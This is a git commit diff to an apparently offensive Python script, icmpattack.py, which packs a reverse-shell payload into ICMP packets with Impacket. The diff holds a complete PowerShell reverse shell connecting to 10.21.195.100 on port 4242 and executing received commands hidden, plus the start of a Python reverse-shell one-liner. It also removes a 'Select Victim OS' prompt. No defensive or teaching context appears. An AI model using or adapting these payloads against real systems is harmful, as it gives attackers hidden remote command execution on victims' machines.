2f3a9fa5540a52523a9aa4648b0466f814f86cef
Dhruva Santosh <dhruvasantosh16@outlook.com>
2022-06-28 02:56:01 +0100

    Trying to upload payload data

--- icmpattack.py
+++ icmpattack.py
@@ -27,18 +27,14 @@ pl_lin = "python -c \'import socket,subprocess;s=socket.socket(socket.AF_INET,so
 
 pl_win = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.21.195.100\",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
-#---OS Selection---#
-sel = input("Select Victim OS (L = Linux / W = Windows ")
-if(sel == 'L' or 'l'):
-    pl_data = pl_lin
-elif(sel == 'W' or 'w'):
-    pl_data = pl_win
-else:
-    print("Invalid Option")
-    exit(1)
-
 #---Payload Byte Formatting--#
-pl_data_b =  pl_data.encode()
-PL_DATA = bytearray(pl_data_b)
-print("Selected Payload: ", PL_DATA)
+PL_DATA =  pl_lin.encode()
+ICMP.contains(ImpactPacket.Data(PL_DATA))
+IP.contains(ICMP)
+
+print(IP)
+
+
+
+
 
